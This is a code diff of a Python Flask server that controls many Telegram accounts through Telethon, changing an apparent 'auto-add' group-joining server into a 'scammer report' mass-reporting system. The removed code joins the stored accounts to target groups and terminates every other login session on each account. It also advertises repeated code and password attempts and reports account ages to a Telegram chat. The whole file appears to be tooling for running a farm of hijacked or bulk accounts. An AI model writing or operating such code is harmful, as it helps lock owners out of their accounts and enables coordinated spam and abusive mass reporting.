-            return jsonify({'success': False, 'error': 'Not found'})
-        
-        targets = ['Abe_armygroup', 'abe_army']
-        results = []
-        
-        async def join_all():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                for target in targets:
-                    try:
-                        entity = await client.get_entity(target)
-                        await client(JoinChannelRequest(entity))
-                        results.append({'group': target, 'status': 'joined'})
-                    except Exception as e:
-                        if 'already' in str(e).lower():
-                            results.append({'group': target, 'status': 'already_member'})
-                        else:
-                            results.append({'group': target, 'status': 'error', 'error': str(e)[:100]})
-                return {'success': True, 'results': results}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(join_all, timeout=45)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/get-sessions', methods=['POST'])
-def get_sessions():
-    try:
-        data = request.json
-        aid = data.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def fetch():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Not authorized'}
-                
-                result = await client(functions.account.GetAuthorizationsRequest())
-                current_hash = None
-                sessions = []
-                
-                for auth in result.authorizations:
-                    session_info = {
-                        'hash': str(auth.hash),
-                        'device_model': auth.device_model or 'Unknown',
-                        'platform': auth.platform or 'Unknown',
-                        'date_active': auth.date_active.timestamp() if auth.date_active else 0,
-                        'ip': auth.ip or 'Unknown',
-                        'country': auth.country or 'Unknown',
-                        'current': auth.current
-                    }
-                    if auth.current:
-                        current_hash = str(auth.hash)
-                    sessions.append(session_info)
-                
-                acc_obj = next((a for a in accounts if a['id'] == aid), None)
-                account_age = acc_obj.get('account_age', {}) if acc_obj else {}
-                
-                return {
-                    'success': True,
-                    'sessions': sessions,
-                    'current_hash': current_hash,
-                    'account_age': account_age
-                }
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(fetch, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/terminate-session', methods=['POST'])
-def terminate_session():
-    try:
-        data = request.json
-        aid = data.get('accountId')
-        hash_val = data.get('hash')
-        
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def terminate():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                await client(functions.account.ResetAuthorizationRequest(hash=int(hash_val)))
-                return {'success': True, 'message': 'Session terminated'}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(terminate, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/terminate-sessions', methods=['POST'])
-def terminate_sessions():
-    try:
-        data = request.json
-        aid = data.get('accountId')
-        
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        async def terminate():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                result = await client(functions.account.GetAuthorizationsRequest())
-                terminated = 0
-                for auth in result.authorizations:
-                    if not auth.current:
-                        try:
-                            await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
-                            terminated += 1
-                        except:
-                            pass
-                return {'success': True, 'message': f'Terminated {terminated} sessions'}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(terminate, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/account-age', methods=['POST'])
-def account_age():
-    try:
-        aid = request.json.get('accountId')
-        acc = next((a for a in accounts if a['id'] == aid), None)
-        if not acc:
-            return jsonify({'success': False, 'error': 'Account not found'})
-        
-        # If we already have age data, return it
-        if acc.get('account_age') and acc['account_age'].get('age_display') and acc['account_age'].get('age_display') not in ['Unknown account age', 'Could not determine', 'Error detecting age', '']:
-            logger.info(f"Returning cached age for account {aid}")
-            return jsonify({'success': True, 'account_age': acc['account_age'], 'cached': True})
-        
-        logger.info(f"Fetching fresh account age for account {aid}")
-        
-        async def check_age():
-            client = get_client(acc)
-            await client.connect()
-            try:
-                if not await client.is_user_authorized():
-                    return {'success': False, 'error': 'Not authorized'}
-                
-                age = get_account_age(client)
-                logger.info(f"Account age result: {age}")
-                
-                # Update the account in memory
-                acc['account_age'] = age
-                
-                # Update in accounts list
-                for i, a in enumerate(accounts):
-                    if a['id'] == aid:
-                        accounts[i]['account_age'] = age
-                        break
-                
-                save_json(ACCOUNTS_FILE, accounts)
-                return {'success': True, 'account_age': age, 'cached': False}
-            finally:
-                await client.disconnect()
-        
-        result = run_telethon_task(check_age, timeout=30)
-        return jsonify(result)
-    except Exception as e:
-        logger.error(f"Account age endpoint error: {e}")
-        return jsonify({'success': False, 'error': str(e)[:100]})
-
-@app.route('/api/send-report')
-def send_report():
-    age_report = ""
-    for acc in accounts:
-        if acc.get('account_age'):
-            age = acc['account_age']
-            age_report += f"\n{acc.get('name', 'Unknown')}: {age.get('age_display', 'N/A')}"
-    
-    send_telegram(
-        f"<b>{SERVER_NAME}</b> Report\n"
-        f"Today: {stats.get('today_added', 0)}\n"
-        f"Total: {stats.get('total_added', 0)}\n\n"
-        f"<b>Account Ages:</b>{age_report}"
-    )
-    return jsonify({'success': True})
+        return jsonify({'success': False, 'error': str(e)})
 
 # ============================================
-# BACKGROUND TASKS
+# BACKGROUND TASKS - ENHANCED
 # ============================================
 def keep_alive():
+    """Enhanced keep-alive with health checks"""
+    consecutive_failures = 0
     while True:
-        time.sleep(240)
+        time.sleep(180)  # Every 3 minutes
         try:
-            requests.get(f"{SERVER_URL}/ping", timeout=10)
-        except:
-            pass
-
-def restore_and_start():
-    time.sleep(5)
-    for acc in list(accounts):
-        if acc.get('session'):
-            if check_account_auth(acc):
-                # Try to get account age if not already present
-                if not acc.get('account_age') or not acc['account_age'].get('age_display') or acc['account_age'].get('age_display') in ['Unknown account age', 'Could not determine', '']:
-                    try:
-                        async def refresh_age():
-                            client = get_client(acc)
-                            await client.connect()
-                            try:
-                                if await client.is_user_authorized():
-                                    age = get_account_age(client)
-                                    acc['account_age'] = age
-                                    
-                                    # Update in accounts list
-                                    for i, a in enumerate(accounts):
-                                        if a['id'] == acc['id']:
-                                            accounts[i]['account_age'] = age
-                                            break
-                                    
-                                    save_json(ACCOUNTS_FILE, accounts)
-                                    logger.info(f"Refreshed age for {acc.get('name')}: {age.get('age_display')}")
-                            finally:
-                                await client.disconnect()
-                        
-                        run_telethon_task(refresh_age, timeout=20)
-                    except Exception as e:
-                        logger.error(f"Failed to refresh age on startup: {e}")
-                
-                start_auto_add(acc)
+            response = requests.get(f"{SERVER_URL}/ping", timeout=15)
+            if response.status_code == 200:
+                consecutive_failures = 0
+                logger.debug("Keep-alive successful")
             else:
-                remove_dead_account(acc['id'], "Failed auth check on startup")
-            time.sleep(2)
-    
-    # Also try to join both groups
-    send_telegram(f"<b>{SERVER_NAME}</b> Online!\nAPI ID: {API_ID}\nTargets: @Abe_armygroup + @abe_army\nAccount age detection: ON")
-    
-    logger.info("All accounts processed")
-    
-    current_time = int(time.time() * 1000)
-    expired_sessions = []
-    for sid in list(temp_sessions.keys()):
-        try:
-            session_time = int(sid)
-            if current_time - session_time > 3600000:
-                expired_sessions.append(sid)
-        except:
-            pass
-    
-    for sid in expired_sessions:
-        del temp_sessions[sid]
-    
-    save_temp_sessions()
+                consecutive_failures += 1
+                logger.warning(f"Keep-alive failed with status: {response.status_code}")
+        except Exception as e:
+            consecutive_failures += 1
+            logger.error(f"Keep-alive error ({consecutive_failures}): {e}")
+            
+            # If too many failures, try to restart critical components
+            if consecutive_failures >= 5:
+                logger.warning("Multiple keep-alive failures, refreshing sessions...")
+                refresh_account_sessions()
+                consecutive_failures = 0
+
+def cleanup_sessions():
+    """Enhanced session cleanup"""
+    while True:
+        time.sleep(600)  # Every 10 minutes
+        current_time = time.time()
+        
+        # Clean temp sessions
+        expired = [sid for sid, data in temp_sessions.items()
+                   if current_time - data.get('created_at', 0) > 7200]
+        for sid in expired:
+            del temp_sessions[sid]
+        if expired:
+            save_temp_sessions()
+            logger.info(f"Cleaned {len(expired)} expired sessions")
+        
+        # Clean session pool
+        session_pool.cleanup()
+        
+        # Check account health
+        inactive = [a for a in accounts if not a.get('active', False)]
+        if inactive:
+            logger.info(f"Found {len(inactive)} inactive accounts")
+
+def periodic_session_refresh():
+    """Periodically refresh account sessions to prevent expiry"""
+    while True:
+        time.sleep(3600)  # Every hour
+        logger.info("Running periodic session refresh...")
+        refresh_account_sessions()
+
+def queue_monitor():
+    """Monitor and log queue status"""
+    while True:
+        time.sleep(60)  # Every minute
+        queue_size = report_queue.qsize()
+        if queue_size > 0:
+            logger.info(f"📊 Report queue size: {queue_size}/{MAX_QUEUE_SIZE}")
 
 # ============================================
-# MAIN
+# INITIALIZATION
 # ============================================
-if __name__ == '__main__':
+def initialize_system():
+    """Initialize the entire system"""
+    global start_time
+    start_time = time.time()
+    
+    # Load all data
     accounts.extend(load_json(ACCOUNTS_FILE, []))
-    auto_add_settings.update(load_json(SETTINGS_FILE, {}))
-    stats_data = load_json(STATS_FILE, {})
-    if stats_data:
-        stats.update(stats_data)
-    worker_adds_data = load_json(WORKER_ADDS_FILE, {})
-    if worker_adds_data:
-        worker_adds.update(worker_adds_data)
-    server_admin.update(load_json(SERVER_ADMIN_FILE, {}))
+    load_reports()
+    load_report_stats()
     load_temp_sessions()
+    load_blacklist()
     
-    print(f"""
-╔══════════════════════════════════════╗
-║  AUTO-ADD SERVER #{SERVER_NUMBER}                    ║
-║  Name: {SERVER_NAME}                             ║
-║  API ID: {API_ID}                       ║
-║  Target: @{TARGET_GROUP} + @abe_army   ║
-║  Port: {PORT}                           ║
-║  Features: Account Age Detection       ║
-║  5x Code/Password Attempts            ║
-╚══════════════════════════════════════╝
-    """)
+    # Log system status
+    active_count = sum(1 for a in accounts if a.get('active', True))
+    logger.info("="*60)
+    logger.info(f"🚀 SCAMMER REPORT SYSTEM v2.0 STARTING")
+    logger.info(f"📱 Accounts: {len(accounts)} ({active_count} active)")
+    logger.info(f"📊 Total Reports: {report_stats.get('total_reports', 0)}")
+    logger.info(f"🎯 Scammers Reported: {report_stats.get('scammers_reported', 0)}")
+    logger.info(f"🚫 Blacklisted: {len(blacklist)}")
+    logger.info(f"🌐 Server URL: {SERVER_URL}")
+    logger.info(f"🔌 Port: {PORT}")
+    logger.info("="*60)
     
-    threading.Thread(target=keep_alive, daemon=True).start()
-    threading.Thread(target=restore_and_start, daemon=True).start()
+    # Start background threads
+    threading.Thread(target=keep_alive, daemon=True, name="KeepAlive").start()
+    threading.Thread(target=cleanup_sessions, daemon=True, name="SessionCleanup").start()
+    threading.Thread(target=periodic_session_refresh, daemon=True, name="SessionRefresh").start()
+    threading.Thread(target=report_queue_processor, daemon=True, name="QueueProcessor").start()
+    threading.Thread(target=queue_monitor, daemon=True, name="QueueMonitor").start()
     
-    app.run(host='0.0.0.0', port=PORT, debug=False)
+    # Initial session refresh
+    threading.Thread(target=refresh_account_sessions, daemon=True).start()
+    
+    logger.info("✅ All background services started")
+
+# Initialize the system
+initialize_system()
+
+if __name__ == '__main__':
+    # Use production WSGI server if available
+    try:
+        from waitress import serve
+        logger.info("Starting with Waitress production server")
+        serve(app, host='0.0.0.0', port=PORT, threads=6)
+    except ImportError:
+        logger.info("Starting with Flask development server")
+        app.run(host='0.0.0.0', port=PORT, debug=False, threaded=True)
